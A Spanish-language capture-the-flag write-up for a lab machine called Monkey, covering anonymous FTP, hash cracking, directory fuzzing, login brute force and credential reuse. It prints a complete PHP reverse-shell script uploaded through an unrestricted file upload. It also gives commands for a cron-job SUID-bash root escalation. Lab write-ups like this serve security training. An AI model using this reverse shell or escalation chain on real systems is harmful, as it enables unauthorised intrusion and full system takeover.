---
title: Monkey - Writeup
date: 2026-02-10 11:14:30 +/-TTTT
categories: [Máquinas]
tags: [Linux, reverse_shell, mysql, SUID, burpsuite]  # TAG names should always be lowercase

description: Laboratorio
toc: false
---

<p style="font-size:1.2rem;">
En este artículo estaré mostrando como resolver la máquina Monkey.
</p>

<p style="font-size:1.2rem;">
Una de las cosas que nos permitirá esta máquina es explotar un servicio interno de MySQL mal configurado, lo que permitió obtener información sensible y credenciales reutilizables. A partir de esta información, se identificó una vulnerabilidad en la aplicación web que permitió la subida de un archivo malicioso, logrando ejecutar una reverse shell y obtener acceso inicial al sistema.
Posteriormente, se realizó el escalamiento de privilegios a root mediante el abuso de un binario con permisos SUID, culminando en la toma total del sistema.
</p>

## Reconocimiento

```
sudo nmap -sS -p- -v -T4 -O -A 192.168.136.151
```

<p style="font-size:1.2rem;">

A continuación, podemos identificar los siguientes <strong>puertos y servicios abiertos</strong>:<br><br>

<strong>21</strong> = open <strong>FTP</strong> vsftpd 3.0.3<br>
<strong>22</strong> = open <strong>SSH</strong> OpenSSH 7.9p1<br>
<strong>80</strong> = open <strong>HTTP</strong> Apache httpd 2.4.38 <br>
</p>

![Desktop View](/assets/img/monkey/foto1.jpeg){: width="800" height="800" }

## Análisis vulnerabilidades

En el puerto del servicio ftp podemos ver que el acceso se puede lograr de forma anònima: 

```
ftp 192.168.136.151
Name: anonymous
Password: anonymous 
```

![Desktop View](/assets/img/monkey/foto2.jpeg){: width="800" height="800" }

Revisando el archivo "nota.txt" vemos algunos usuarios y contraseñas y ademàs nos damos cuenta
que la contraseña està reutilizada en varios servicios.

Con el hash MD5 "8d2473d579e5a11924906def258f97a1" lo ciframos por medio de la aplicaciòn crackstation o tambièn puede 
ser con jhon the ripper o hashcat: 

![Desktop View](/assets/img/monkey/foto2_0.jpeg){: width="800" height="800" }

la contraseña descifada es "junio01".

En el puerto del servicio http hacemos un fuzzing de directorios: 

```
wfuzz -u http://192.168.136.151/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -c --hc 404
```

![Desktop View](/assets/img/monkey/foto3.jpeg){: width="800" height="800" }


A continuaciòn, encontramos dos directorios "phpmyadmin" y "monkey": 

![Desktop View](/assets/img/monkey/foto4.jpeg){: width="800" height="800" }

![Desktop View](/assets/img/monkey/foto5.jpeg){: width="800" height="800" }

Hacemos otro fuzzing màs en el direcotorio "monkey":

```
gobuster dir -t 200 -u http://192.168.136.151/monkey -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Encontramos màs subdirectorios: 

![Desktop View](/assets/img/monkey/foto6.jpeg){: width="800" height="800" }

Utilizamos burpsuite para hacer una fuerza bruta de credenciales en el login de este sitio basàndonos en los usuarios y las contraseñas que encontramos: 

![Desktop View](/assets/img/monkey/foto7.jpeg){: width="800" height="800" }

Encontramos que la contraseña, es "junior01" y las credenciales son las siguientes para logearnos en este directorio:

```
Usuario: hackermentor 
Contraseña: junior01 
```

![Desktop View](/assets/img/monkey/foto8.jpeg){: width="800" height="800" }

Tenemos acceso a la pàgina web:

![Desktop View](/assets/img/monkey/foto9.jpeg){: width="800" height="800" }

En el siguiente subdirectorio de monkey llamado "db", encontramos un archivo de base de datos llamado "onlinecourse.sql": 

![Desktop View](/assets/img/monkey/foto10.jpeg){: width="800" height="800" }

Vemos que en este archivo de base de datos tine un usuario y contraseña que al parecer es del subdirectorio del directorio de monkey llamado "admin":

![Desktop View](/assets/img/monkey/foto11.jpeg){: width="800" height="800" }

```
Usuario: admin 
Usuario: admin 

```

![Desktop View](/assets/img/monkey/foto12.jpeg){: width="800" height="800"}
![Desktop View](/assets/img/monkey/foto13.jpeg){: width="800" height="800"}

Tenemos acceso a la pàgina web de amdin.

## Toma del sistema

De la pàgina anterior del directorio de monkey podemos ver que en la secciòn de "mi perfil" se puede subir cualquier tipo de archivo (no solo una imagen)
y esto nos da una clarìsima oportunidad de hacer una reverb_shell de tipo php: 

![Desktop View](/assets/img/monkey/foto14.jpeg){: width="800" height="800"}

Generamos una revshell de tipo php en el puerto 9001.

Abrimos el puerto 9001 en modo escucha con Netcat 

```
nc -lvnp 9001
```
![Desktop View](/assets/img/monkey/foto17.jpeg){: width="800" height="800"}

Guardamos este còdigo php en un archivo.txt:

```
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.136.136';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>

```

![Desktop View](/assets/img/monkey/foto16.jpeg){: width="800" height="800"}

![Desktop View](/assets/img/monkey/foto19.jpeg){: width="800" height="800"}

Subimos el archivo y vemos que tenemos acceso a la màquina y entramos a la màquina como www-data: 

![Desktop View](/assets/img/monkey/foto20.jpeg){: width="800" height="800"}

Para generar una shell màs dinàmica e interactiva ejeuctaamos:

```
script /dev/null -c bash // Genera un pseudo-terminal (PTY)
CTRL + Z 
stty raw -echo;fg
reset 
xterm 
echo $TERM -> ver variables 
echo $SHELL
TERM=xterm
Shell=bash
```

Cuando obtienes una reverse shell básica con nc, normalmente es una shell limitada sin TTY real, lo que impide usar correctamente comandos interactivos como nano, vim, sudo o combinaciones como CTRL+C. Los comandos como script /dev/null -c bash o python3 -c 'import pty; pty.spawn("/bin/bash")' se usan para generar una pseudo-terminal (PTY) y mejorar la interacción; luego se suspende la sesión con CTRL+Z, se ejecuta stty raw -echo; fg para corregir el manejo del teclado y devolver la shell al primer plano, y finalmente se usa reset y export TERM=xterm para restaurar correctamente la terminal. En conjunto, todo este proceso convierte una shell inestable en una shell interactiva mucho más funcional y estable para post-explotación.

Analizando en el directorio /home/hackermentor descubrimos la 1era bandera: 

![Desktop View](/assets/img/monkey/foto21.jpeg){: width="800" height="800"}

Pero explotando el sistema todavìa no conseguimos entrar como root ya que por el momento solo somos un usuario sin privilegios:

En el directorio /var/www/html/monkey buscamos la palabra .config dentro que son archivos de configuraciòn: 

```
grep -r .config
```

![Desktop View](/assets/img/monkey/foto22.jpeg){: width="800" height="800"}

Vemos que encontramos varios archivos de configuraciòn, pero lo que màs me interesa si en estos archivos hay alguna credencial o contraseña asì que hacemos una bùsqueda màs especìfica de ello con el comando de grep tambièn: 

```
grep -r password
```

![Desktop View](/assets/img/monkey/foto23.jpeg){: width="800" height="800"}

En el subdirectorio includes/config.php analizamos que hay una contraseña que al parecer es de un servicio sql interno:

![Desktop View](/assets/img/monkey/foto24.jpeg){: width="800" height="800"}

Comprobamos si podemos acceder a la base de datos con esta contraseña: 

```
mysql -u hackermentor -p 
password: M1_P4ssw0rd_segur@
```

Y efectivamente logramos acceder: 

![Desktop View](/assets/img/monkey/foto25.jpeg){: width="800" height="800"}

Ejecutamos los siguientes comandos para analizar informaciòn sensible: 

```
SHOW DATABASES;  // Muestra todas las bases de datos existentes en el servidor MySQL.
```

```
USE onlinecourse;   // Selecciona la base de datos llamada onlinecourse
```

```
SHOW TABLES;   // Muestra todas las tablas que existen dentro de la base seleccionada.
```

```
SELECT * FROM admin;    // Muestra todas las columnas y todos los registros de la tabla admin
```

![Desktop View](/assets/img/monkey/foto31.jpeg){: width="800" height="800"}

Nuevamente descubrimos el usuario de la contraseña de admin: 

Algo interesante que vimos previamente al explotar el servicio ftp es de que decìa que las contraseñas estàn reutilizadas 
en otros servicios tambièn. Y no hace mucho vimo que tambièn el servico ssh està habilitado asì que probamos si la contraseña
que encontramos en los archivos de configuraciòn del servico http corresponde al servicio ssh: 

```
ssh hackermentor@192.168.136.151
password: M1_P4ssw0rd_segur@
```
Logramos logearnos exitosamente y ahora somos el usuario "hackermentor": 

![Desktop View](/assets/img/monkey/foto30.jpeg){: width="800" height="800"}

## Escalada de privilegios

Pero todavìa no somos root.
Enumeramos directorios escribibles en todo el sistema, algo muy útil para detectar posibles vectores de escalada o abuso de permisos: 

```
find / -writable -type d 2>/dev/null
```

![Desktop View](/assets/img/monkey/foto42.jpeg){: width="800" height="800"}

En este directorio /dev/shm descargamos "linpeas" que nos va a servir para analizar automáticamente posibles vectores de escalada de privilegios en esta màquina y lo descargamos aquì ya que no deja rastros en el disco:

Descargar linpeas.sh: 

```
wget 'https://github.com/peass-ng/PEASS-ng/releases/download/20260201-2ddf3a96/linpeas.sh'
```

![Desktop View](/assets/img/monkey/foto32.jpeg){: width="800" height="800"}

Levantamos un servidor web con python3 para que nos permita que la màquina explotada descargue la herramienta de linpeas desde 
nuestra màquina: 

```
python3 - m http.server 8000
```
![Desktop View](/assets/img/monkey/foto33.jpeg){: width="800" height="800"}

Copiamos el link y lo descargamos en nuestra màquina vulnerable: 

![Desktop View](/assets/img/monkey/foto34.jpeg){: width="800" height="800"}

![Desktop View](/assets/img/monkey/foto35.jpeg){: width="800" height="800"}

Damos permisos de ejeuciòn y lo ejecutamos para empezar con el anàlisis: 

```
chmod +x linpeas.sh
```

```
./linpeas.sh
```

![Desktop View](/assets/img/monkey/foto36.jpeg){: width="800" height="800"}

![Desktop View](/assets/img/monkey/foto37.jpeg){: width="800" height="800"}

Encontramos que existe un cron job que se ejecuta cada minuto el script /home/hackermentor/backup.sh, lo cual puede ser explotable si tienes permisos sobre ese archivo: 

![Desktop View](/assets/img/monkey/foto39.jpeg){: width="800" height="800"}

Analizamos el contenido del còdigo del archivo backup.sh 

![Desktop View](/assets/img/monkey/foto41.jpeg){: width="800" height="800"}

Estse script hace un backup comprimido de un directorio web y protege el archivo generado. Primero ejecuta /bin/bash (indicando que se usa esa shell), luego elimina cualquier archivo anterior llamado /tmp/backup.zip, después crea un nuevo archivo comprimido con zip -r del directorio /var/www/html/monkey/includes y lo guarda en /tmp/backup.zip, y finalmente cambia sus permisos a 700, lo que significa que solo el dueño del archivo puede leerlo, modificarlo o ejecutarlo, y nadie más tiene acceso.

Para explotar esta vulnerabilidad, se añade la siguiente línea al script del archivo del backup.sh:

```
chmod +s /bin/bash
```

![Desktop View](/assets/img/monkey/foto43.jpeg){: width="800" height="800"}

Esta instrucción establece el bit SUID en el binario /bin/bash. Debido a que el cron job se ejecuta como root, al ejecutarse el script, el binario bash adquiere el bit SUID con propietario root.

Después de esperar a que el cron job se ejecutara (máximo un minuto), se verificó que el bit SUID había sido aplicado correctamente:

```
ls -la /bin/bash
```

![Desktop View](/assets/img/monkey/foto44.jpeg){: width="800" height="800"}

Y ejecutamos este comando para explotar el binario y acceder como root: 

```
/bin/bash -p
```

![Desktop View](/assets/img/monkey/foto45.jpeg){: width="800" height="800"}

Finalmente obtenemos la 2da bandera: 

![Desktop View](/assets/img/monkey/foto46.jpeg){: width="800" height="800"}


























